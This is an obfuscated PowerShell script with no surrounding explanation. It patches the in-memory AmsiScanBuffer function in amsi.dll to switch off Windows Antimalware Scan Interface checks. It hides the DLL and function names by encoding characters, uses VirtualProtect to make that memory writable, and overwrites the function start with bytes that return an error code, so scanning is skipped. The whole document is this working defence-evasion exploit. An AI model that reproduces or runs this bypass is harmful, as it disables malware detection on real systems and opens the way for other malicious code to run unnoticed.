$WvG4Eq_HUrD = @"
using System;
using System.Runtime.InteropServices;
public class WvG4Eq_HUrD {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr ALRgsoqwv9dgWupro, string ktc9NC6H5fpGFCNlAkJ);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr ryoWwgdea8_N, UIntPtr h_yMGrK, uint KCQ, out uint wZml);
}
"@

Add-Type $WvG4Eq_HUrD

$OH_AUU = [WvG4Eq_HUrD]::LoadLibrary("$(('ãmsî.d'+'ll').NormalIZe([CHaR]([byte]0x46)+[cHAR](111)+[CHaR](29+85)+[cHAr](4+105)+[char]([ByTE]0x44)) -replace [cHaR]([BYtE]0x5c)+[CHar]([ByTE]0x70)+[cHAR]([bytE]0x7b)+[CHAr]([byte]0x4d)+[Char]([bYtE]0x6e)+[cHAr]([byTe]0x7d))")
$rsFywA9Jqy2fd_Iq9MH9 = [WvG4Eq_HUrD]::GetProcAddress($OH_AUU, "$(('ÄmsíScã'+'nBúffèr').noRmALIze([cHAR]([BYtE]0x46)+[ChAr]([bYTE]0x6f)+[ChAr](109+5)+[cHaR](109+7-7)+[chaR]([bYte]0x44)) -replace [Char]([bYtE]0x5c)+[chaR](4+108)+[chAR](123)+[CHar]([BYTe]0x4d)+[CHAR](110+69-69)+[ChAR](69+56))")
$p = 0
[WvG4Eq_HUrD]::VirtualProtect($rsFywA9Jqy2fd_Iq9MH9, [uint32]5, 0x40, [ref]$p)
$BWCOM = "0xB8"
$UOHY = "0x57"
$iM6g = "0x00"
$Uxl32s9c = "0x07"
$zlB8p4jXwARh9 = "0x80"
$N8QW1s = "0xC3"
$xPs9wz3kB9f = [Byte[]] ($BWCOM,$UOHY,$iM6g,$Uxl32s9c,+$zlB8p4jXwARh9,+$N8QW1s)
[System.Runtime.InteropServices.Marshal]::Copy($xPs9wz3kB9f, 0, $rsFywA9Jqy2fd_Iq9MH9, 6)